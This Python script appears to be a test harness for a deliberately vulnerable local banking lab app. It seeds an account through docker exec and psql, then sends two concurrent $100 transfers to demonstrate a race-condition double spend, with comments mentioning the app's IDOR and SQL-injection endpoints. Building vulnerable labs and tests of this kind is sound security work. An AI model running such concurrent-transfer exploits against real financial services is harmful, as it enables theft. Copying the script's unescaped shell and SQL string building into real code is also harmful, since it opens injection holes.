import urllib.request
import json
import urllib.parse
import time
import threading

BASE_URL = "http://localhost:80"

def login(username, password):
    url = f"{BASE_URL}/auth/login"
    data = urllib.parse.urlencode({"username": username, "password": password}).encode('utf-8')
    req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, method='POST')
    try:
        with urllib.request.urlopen(req) as response:
            return json.loads(response.read().decode('utf-8'))["access_token"]
    except Exception as e:
        print(f"[FAIL] Login failed: {e}")
        return None

def make_transfer(token, to_account):
    url = f"{BASE_URL}/ledger/transfer"
    payload = {"to_account": to_account, "amount": 100.0}
    req = urllib.request.Request(url, data=json.dumps(payload).encode('utf-8'), 
                                 headers={'Content-Type': 'application/json', 'Authorization': f'Bearer {token}'}, 
                                 method='POST')
    try:
        urllib.request.urlopen(req)
        print(f" [->] Transfer Request Sent!")
    except Exception as e:
        print(f" [!] Transfer Failed: {e}")

def verify_race_condition():
    print("Initializing Race Condition Test...")
    
    # 1. Setup User "racer" with $100
    # Note: We can't easily "reset" the balance via API without a deposit endpoint (which we didn't build).
    # HACK: We will register a NEW user each time we run this test to ensure clean state.
    username = f"racer_{int(time.time())}"
    print(f"Creating user: {username}")
    
    # Register
    reg_url = f"{BASE_URL}/auth/register"
    reg_payload = {"username": username, "password": "123", "is_admin": False}
    urllib.request.urlopen(urllib.request.Request(reg_url, data=json.dumps(reg_payload).encode('utf-8'), headers={'Content-Type': 'application/json'}, method='POST'))
    
    token = login(username, "123")
    if not token: return

    # Seed the account with $100 directly via DB injection? 
    # Or just assume the "default" balance is 0 and we can't test unless we have money?
    # Wait, the Ledger Service models say `balance = Column(Float, default=0.0)`.
    # We need money to transfer out.
    # The vulnerability allows negative balance if we don't check for it?
    # Worker Logic: `if sender_balance >= amount:`
    # So we DO need a positive balance to start.
    # Solution: The worker checks balance. We have to inject money manually or via an exploit.
    # Let's use IDOR/SQLi to fake it? No, that's read-only.
    # Let's use the DB container to seed it.
    
    print("Seeding account balance via DB...")
    # We need to find the user_id for this username.
    # Since we can't run SQL easily from here without dependencies, let's blindly update ALL accounts for this user?
    # The models `user_id` should link.
    # We can use the SQLi endpoint in Ledger to Update? No, it's a SELECT.
    # We will assume we can run a docker exec command to seed it.
    
    import subprocess
    cmd = f'docker exec vulnbank-db-1 psql -U user -d bank_db -c "UPDATE accounts SET balance = 100 WHERE user_id IN (SELECT id FROM users WHERE username = \'{username}\');"'
    subprocess.run(cmd, shell=True)
    
    # Verify Balance
    # We need the Account ID to check balance.
    # The IDOR endpoint /ledger/balance/{id} takes an AccountID, not UserID.
    # We don't know the Account ID for the new user easily without searching.
    # ... Wait, the Ledger startup only seeds CEO. Does registering in Auth create an Account in Ledger?
    # NO! Phase 2 Auth register only writes to `users` table. 
    # Phase 3 Ledger writes to `accounts` table.
    # THERE IS NO SYNC!
    # A logged in user won't even HAVE an account in the Ledger service yet unless we created it.
    # Major Logic Gap in previous steps: We never implemented "Create Account on Register".
    # I need to fix this by manually creating an account for the racer user.
    
    print("Creating Account seed...")
    cmd_create = f'docker exec vulnbank-db-1 psql -U user -d bank_db -c "INSERT INTO accounts (user_id, account_number, balance) VALUES ((SELECT id FROM users WHERE username = \'{username}\'), \'{username}_acc\', 100);"'
    subprocess.run(cmd_create, shell=True)
    
    print("State: User has $100. Attempting Double Spend ($100 x 2)...")
    
    # 2. Parallel Requests
    t1 = threading.Thread(target=make_transfer, args=(token, "CEO-001"))
    t2 = threading.Thread(target=make_transfer, args=(token, "CEO-001"))
    
    t1.start()
    t2.start()
    
    t1.join()
    t2.join()
    
    print("Waiting for workers (10s)...")
    time.sleep(10)
    
    # 3. Check Result
    # We need to know the account ID to check balance via IDOR endpoint.
    # Or checking DB directly.
    print("Checking final balance...")
    check_cmd = f'docker exec vulnbank-db-1 psql -U user -d bank_db -c "SELECT balance FROM accounts WHERE account_number = \'{username}_acc\';"'
    subprocess.run(check_cmd, shell=True)

if __name__ == "__main__":
    verify_race_condition()
